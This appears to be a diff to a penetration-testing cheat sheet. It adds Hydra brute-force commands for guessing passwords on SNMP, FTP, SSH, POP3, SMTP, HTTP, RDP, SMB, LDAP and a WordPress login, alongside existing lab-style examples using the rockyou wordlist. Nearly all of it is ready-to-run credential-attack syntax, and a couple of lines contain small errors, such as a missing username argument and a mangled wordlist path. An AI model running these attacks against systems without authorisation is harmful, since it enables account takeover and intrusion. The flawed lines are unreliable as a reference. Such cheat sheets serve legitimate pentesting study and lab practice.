@@ -49,13 +49,27 @@ hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 
 ````
 #### Example Syntax
 ````
+hydra -P password-file.txt -v $ip snmp	Hydra brute force against SNMP
+hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp	Hydra FTP known user and rockyou password list
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	Hydra SSH using list of users and passwords
+hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh	Hydra SSH using a known password and a username list
+hydra $ip -s 22 ssh -l -P big_wordlist.txt	Hydra SSH Against Known username on port 22
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	Hydra POP3 Brute Force
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	Hydra SMTP Brute Force
+hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	Hydra attack http get 401 login with a dictionary
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	Hydra attack Windows Remote Desktop with rockyou
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	Hydra brute force SMB user with rockyou:
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	Hydra brute force a Wordpress admin login
+hydra -L usernames.txt -P passwords.txt $ip smb -V -f	SMB Brute Forcing
+hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	LDAP Brute Forcing
+````
+#### Additional Syntax Formats
+````
 sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
 sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
 sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
 hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
 ````
-
-
 
 
 
